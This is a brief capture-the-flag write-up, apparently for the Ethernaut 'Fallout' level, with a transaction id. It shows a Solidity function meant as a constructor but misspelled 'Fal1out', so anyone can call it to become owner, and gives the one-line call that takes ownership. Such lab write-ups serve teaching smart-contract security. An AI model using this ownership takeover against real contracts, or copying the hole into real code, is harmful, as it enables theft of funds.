tx id: `0xd727cc9744f4afff4842db3831540a24c618fec5879576fa924e7a83f0ae242b`

# claim ownership of the contract

no ownership transfers (`owner = msg.sender;`) like in level 1 except in constructoor:

```
 /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }
```

just `await contract.Fal1out()` to claim ownership
